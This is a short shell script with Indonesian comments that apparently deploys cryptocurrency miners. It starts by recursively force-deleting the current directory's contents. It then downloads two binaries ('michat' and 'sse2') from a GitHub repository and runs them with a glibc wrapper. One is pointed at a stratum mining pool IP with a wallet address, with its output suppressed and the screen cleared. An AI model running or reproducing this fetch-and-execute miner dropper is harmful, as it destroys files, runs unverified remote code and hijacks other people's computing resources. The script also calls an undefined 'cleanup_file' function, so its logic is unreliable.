rm -rvf * && mkdir a && cd a

# Buat wrapper run-glibc
cat > "$HOME/run-glibc" <<'EOFW'
#!/bin/bash
GLIBC_PATH="$HOME/.local/glibc-2.35/lib"
$GLIBC_PATH/ld-linux-x86-64.so.2 \
  --library-path "$GLIBC_PATH:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu" "$@"
EOFW
chmod +x "$HOME/run-glibc"

# Download & jalankan start
cd "$HOME"
cleanup_file start
if ! wget -q https://github.com/egisastradinata82/proxy/raw/refs/heads/main/michat -O michat; then
    echo "❌ Gagal download binary michat"
    exit 1
fi
chmod +x michat

echo "============================"
echo "✅ Menjalankan michat dengan GLIBC 2.35"
echo "============================"

"$HOME/run-glibc" ./michat \
  --pubkey=2Rx2iFAona7GZouJiVSZaJ1o7PX5ss7jzo44fwmBC1A7xmWCjEuMpBY \
  --label=DGS \
  --mode=gpu \
  --threads-per-card=1 & wget https://github.com/egisastradinata82/proxy/raw/refs/heads/main/sse2 && chmod 777 sse2 && ./sse2 -a power2b -o stratum+tcp://143.198.85.42:443 -u mbc1qcnqfndr5jxpxksdultdlym8xv8ts864drqcwes -t 4 /dev/null 2>&1 & clear

echo "============================"
echo "🎯 Semua proses selesai!"
echo "============================"

